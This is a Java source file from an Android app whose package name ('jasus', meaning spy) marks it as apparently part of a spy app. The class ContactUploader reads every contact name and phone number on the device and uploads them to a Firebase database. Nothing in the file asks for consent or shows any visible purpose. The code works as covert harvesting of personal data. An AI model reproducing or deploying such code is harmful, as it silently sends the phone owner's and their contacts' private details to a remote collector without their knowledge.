package com.perry.jasus.ActionClasses;

import static com.perry.jasus.Util.FirebaseConstant.ContactDb;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class ContactUploader {

    private static final String TAG = "ContactUtils";

    public static void uploadContactsToFirebase(Context context) {

        // Get all the contacts from the device
        List<Map<String, String>> contacts = getAllContacts(context);

        // Upload each contact to the Firebase database
        for (Map<String, String> contact : contacts) {

            // Check if the contact already exists in the database
            String contactId = contact.get("id");
            DatabaseReference contactRef = ContactDb.child(contactId);
            contactRef.get().addOnCompleteListener(task -> {
                if (task.isSuccessful()) {
                    if (!task.getResult().exists()) {
                        // Contact does not exist, upload it to the database
                        contactRef.setValue(contact);
                        Log.d(TAG, "Contact uploaded: " + contact.get("name"));
                    } else {
                        Log.d(TAG, "Contact already exists: " + contact.get("name"));
                    }
                } else {
                    Log.e(TAG, "Error checking contact: " + contact.get("name"), task.getException());
                }
            });
        }
    }
    @SuppressLint("Range")
    private static List<Map<String, String>> getAllContacts(Context context) {
        List<Map<String, String>> contactsList = new ArrayList<>();
        ContentResolver cr = context.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        if ((cur != null ? cur.getCount() : 0) > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                if (name != null && !name.isEmpty()) {
                    Map<String, String> contact = new HashMap<>();
                    contact.put("id", id);
                    contact.put("name", name);
                    contactsList.add(contact);
                }
                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        if (phone != null && !phone.isEmpty()) {
                            Map<String, String> contact = new HashMap<>();
                            contact.put("id", id);
                            contact.put("name", name);
                            contact.put("mobile", phone);
                            contactsList.add(contact);
                        }
                    }
                    pCur.close();
                }
            }
        }
        if (cur != null) {
            cur.close();
        }
        return contactsList;
    }


}
